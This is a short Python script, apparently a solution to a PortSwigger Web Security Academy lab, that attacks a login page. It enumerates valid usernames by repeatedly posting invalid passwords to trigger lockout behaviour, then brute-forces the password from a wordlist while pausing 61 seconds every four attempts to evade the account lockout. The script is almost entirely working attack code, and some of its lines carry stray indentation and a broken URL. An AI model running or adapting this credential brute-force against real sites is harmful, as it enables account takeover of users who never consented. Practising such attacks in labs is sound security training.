import requests, time


 url = "https://0a3 5714949009f00b3.web-security-academy.net/login"
passwd_list = 'PortSwigger/passwords.txt'
user_list = '/PortSwigger/usernames.txt'

 with open(user_list, 'r') as f:
    usernames = [line.strip() for line in f if line.strip()]

with open(passwd_list, 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

Valid_username = None
Valid_passwd = None
session = requests.Session()

 def user_enum():
    global Valid_username
    for user in usernames:
        for i in range(4):   
            data = f'username={user}&password=invalidpass'
            res = session.post(url=url, data=data)

            if 'Invalid username or password.' not in res.text:
                print(f'\n\n[✔] Valid Username: {user}\n')
                Valid_username = user
                return
        print(f"[-] Invalid Username: {user}")

def passwd_enum(username):
    global Valid_passwd 
    n = 0
    for passwd in passwords:
        data = f'username={username}&password={passwd}'
        res = session.post(url=url, data=data, allow_redirects=False)

        if res.status_code == 302:
            Valid_passwd = passwd
            print(f'\n[🎯] Valid Password: {passwd}\n')
            return

        print(f'[-] Invalid Password: {passwd}')
        n += 1

        if n == 4:
            print('[*] Waiting 61 seconds for lockout reset...')
            time.sleep(61)
            n = 0


 user_enum()

if Valid_username:
    print('[*] Waiting 61 seconds before password bruteforce...')
    time.sleep(61)
    passwd_enum(Valid_username)
    print(f'\n[🔥] Credentials Found: Username = {Valid_username} | Password = {Valid_passwd}')
else:
    print('[-] No valid username found. Exiting...')
